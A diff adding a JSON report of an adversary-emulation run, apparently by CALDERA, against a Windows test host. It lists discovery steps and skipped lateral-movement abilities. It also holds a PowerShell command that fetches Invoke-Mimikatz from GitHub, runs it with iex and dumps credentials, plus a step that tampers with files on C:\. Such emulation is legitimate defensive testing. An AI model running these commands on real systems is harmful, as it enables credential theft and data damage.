+                    "ability_name": "Find Hostname",
+                    "reason": "Fact dependency not fulfilled",
+                    "reason_id": 2
+                },
+                {
+                    "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
+                    "ability_name": "Copy 54ndc47 (WinRM and SCP)",
+                    "reason": "Fact dependency not fulfilled",
+                    "reason_id": 2
+                },
+                {
+                    "ability_id": "c5e75d70-09ae-469f-8717-621a1b7ef946",
+                    "ability_name": "Copy 54ndc47 (SMB)",
+                    "reason": "Fact dependency not fulfilled",
+                    "reason_id": 2
+                },
+                {
+                    "ability_id": "10a9d979-e342-418a-a9b0-002c483e0fa6",
+                    "ability_name": "Start 54ndc47",
+                    "reason": "Wrong platform",
+                    "reason_id": 0
+                },
+                {
+                    "ability_id": "2a32e46f-5346-45d3-9475-52b857c05342",
+                    "ability_name": "Start 54ndc47 (WMI)",
+                    "reason": "Fact dependency not fulfilled",
+                    "reason_id": 2
+                },
+                {
+                    "ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921",
+                    "ability_name": "Start Agent (WinRM)",
+                    "reason": "Fact dependency not fulfilled",
+                    "reason_id": 2
+                }
+            ]
+        }
+    ],
+    "start": "2019-10-24 14:02:07",
+    "steps": {
+        "AJ-Win7x64$AJ-Win7x64\\testuser": {
+            "agent_id": 1,
+            "steps": [
+                {
+                    "ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1135",
+                        "technique_name": "Network Share Discovery"
+                    },
+                    "command": "Get-SmbShare",
+                    "delegated": "2019-10-24 14:02:44.547318",
+                    "description": "Network Share Discovery",
+                    "executor": "psh",
+                    "name": "View admin shares",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:02:45",
+                    "status": 1
+                },
+                {
+                    "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
+                    "attack": {
+                        "tactic": "discovery",
+                        "technique_id": "T1018",
+                        "technique_name": "Remove System Discovery"
+                    },
+                    "command": "arp -a",
+                    "delegated": "2019-10-24 14:02:44.547464",
+                    "description": "Locate all active IP and FQDNs on the network",
+                    "executor": "psh",
+                    "name": "Collect ARP details",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:05:04",
+                    "status": 0
+                },
+                {
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "attack": {
+                        "tactic": "credential-access",
+                        "technique_id": "T1003",
+                        "technique_name": "Credential Dumping"
+                    },
+                    "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };$web = (New-Object System.Net.WebClient);$result = $web.DownloadString(\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1\");iex $result; Invoke-Mimikatz -DumpCreds",
+                    "delegated": "2019-10-24 14:02:44.547582",
+                    "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "executor": "psh",
+                    "name": "Run PowerKatz",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:08:35",
+                    "status": 0
+                },
+                {
+                    "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
+                    "attack": {
+                        "tactic": "impact",
+                        "technique_id": "T1492",
+                        "technique_name": "Stored Data Manipulation"
+                    },
+                    "command": "mv mission.go mission.exe;.\\mission.exe -duration 60 -extension .caldera -dir 'C:\\';",
+                    "delegated": "2019-10-24 14:10:26.569117",
+                    "description": "Hunts for files of a certain extension and inserts a message",
+                    "executor": "psh",
+                    "name": "File Hunter Mission",
+                    "platform": "windows",
+                    "run": "2019-10-24 14:10:26",
+                    "status": 1
+                }
+            ]
+        }
+    }
+}
